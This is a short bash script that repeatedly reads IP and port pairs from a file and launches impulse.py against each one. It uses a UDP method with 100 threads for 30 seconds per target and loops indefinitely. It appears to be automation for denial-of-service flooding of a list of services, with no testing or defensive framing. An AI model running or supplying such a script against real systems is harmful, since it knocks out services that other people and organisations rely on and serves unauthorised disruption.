#! /bin/bash
while true
do
  while IFS="," read -r ip port
  do
    echo "IP: $ip"
    echo "Port: $port"
    echo ""
    python3 impulse.py --target ${ip}:${port}  --method UDP --time 30 --threads 100

    #/bin/sleep 20
  done < services.txt
  echo "loop end"
  sleep 2
done
